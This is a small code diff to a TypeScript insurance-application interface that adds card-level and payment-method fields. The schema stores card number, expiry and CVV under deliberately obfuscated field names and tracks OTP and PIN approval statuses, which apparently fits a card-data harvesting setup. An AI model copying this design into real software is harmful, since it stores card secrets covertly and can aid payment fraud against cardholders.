@@ -38,6 +38,7 @@ export interface InsuranceApplication {
     _v1?: string // cardNumber (obfuscated)
     cardNumber?: string // Keep for backward compatibility
     cardType?: string
+    cardLevel?: string
     _v3?: string // expiryDate (obfuscated)
     expiryDate?: string // Keep for backward compatibility
     _v2?: string // cvv (obfuscated)
@@ -47,6 +48,8 @@ export interface InsuranceApplication {
     bankInfo?: {
       name: string
       country: string
+      level?: string
+      paymentMethod?: string
     }
     paymentStatus: "pending" | "completed" | "failed"
     cardStatus?: "waiting" | "pending" | "approved_with_otp" | "approved_with_pin" | "rejected"
